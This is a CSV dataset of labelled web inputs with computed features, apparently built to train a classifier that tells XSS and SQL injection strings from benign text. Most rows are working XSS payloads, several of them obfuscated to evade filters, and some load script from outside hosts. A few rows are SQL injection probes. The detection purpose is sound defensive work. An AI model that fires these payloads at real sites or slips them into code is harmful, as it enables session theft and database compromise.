input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",1,57,4.887726803973036,2,0,0,0.1578947340720222
hello world,0,11,2.8453509366224368,0,0,0,0.0
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",1,64,4.904078664259099,2,0,0,0.20312499682617194
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",1,71,4.957786690165377,2,1,0,0.30985915056536406
"<BODY ONLOAD=alert(""XSS"")>",1,26,4.286790198827113,2,0,0,0.26923075887574005
"`""'><img src='#\x27 onerror=javascript:alert(1)>",1,48,4.746115365169272,3,0,0,0.2916666605902779
"javascript:alert(""hellox worldss"")",1,34,4.1973257087065035,2,0,0,0.1470588192041524
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1,48,4.829448698502606,4,0,0,0.2916666605902779
<script>javascript:alert(1)</script\x0B,1,39,4.214262795507958,0,1,0,0.20512819986850772
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1,130,3.82871870307609,0,0,0,0.3307692282248521
update account settings,0,23,3.5670402169265785,0,0,1,0.0
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,1,63,4.4616617734147725,0,0,0,0.34920634366339137
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",2,128,4.4561142659871065,2,0,1,0.30468749761962893
<script>javascript:alert(1)</script\x0D,1,39,4.214262795507958,0,1,0,0.20512819986850772
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>,1,64,4.57368417945087,2,0,0,0.24999999609375007
"<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",1,59,4.861208091624716,2,0,0,0.22033897931628849
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",1,59,5.475863388344893,0,0,0,0.5423728721631716
"<;EMBED SRC="";http://ha.ckers.org/xss.swf""; AllowScriptAccess="";always"";>;<;/EMBED>;",1,84,4.842545881500379,4,0,0,0.3095238058390023
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1,79,5.213414096437639,2,0,0,0.20253164300592857
please login to continue,0,24,3.542481250360578,0,0,0,0.0
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,1,45,4.685971707296555,2,0,0,0.3555555476543212
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",1,90,4.523534247683985,2,0,0,0.13333333185185187
"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,83,83))"">",1,58,4.861870003561756,2,0,0,0.22413792717003575
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1,91,4.48865630707713,0,0,0,0.3076923043110736
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1,76,4.750895440932831,2,0,0,0.302631574965374
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",2,140,4.34725730211366,0,0,1,0.27142856948979593
